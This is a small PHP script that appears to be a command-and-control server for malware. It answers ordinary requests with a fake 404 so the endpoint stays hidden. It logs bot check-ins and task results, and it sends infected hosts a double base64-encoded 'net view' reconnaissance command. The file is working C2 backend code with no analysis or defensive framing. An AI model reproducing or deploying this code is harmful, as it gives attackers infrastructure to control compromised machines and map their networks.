<?php
if(empty($_POST))
{
header("HTTP/1.0 404 Not Found");
die();
}

$log_file = "log.txt";

if(isset($_POST['p']))
{
	//Initial checkin
	if($_POST['p'] === 'i' || $_POST['p'] === 'ip')
	{
		file_put_contents($log_file, "Checkin: ".print_r($_POST, true), FILE_APPEND);
		echo "crx6";
	}	
	//task request
	elseif($_POST['p'] === 't')
	{
		
		file_put_contents($log_file, "Task Request: ".print_r($_POST, true), FILE_APPEND);
		$cmd = base64_encode("\n".base64_encode("net view"));
		echo $cmd;
	}
	//Task answer / results
	elseif($_POST['p'] === 'a')
	{
		file_put_contents($log_file, "Task Answer: ".print_r($_POST, true), FILE_APPEND);
	}
}
	else
	{
		header("HTTP/1.0 404 Not Found");
		die();
	}
?>
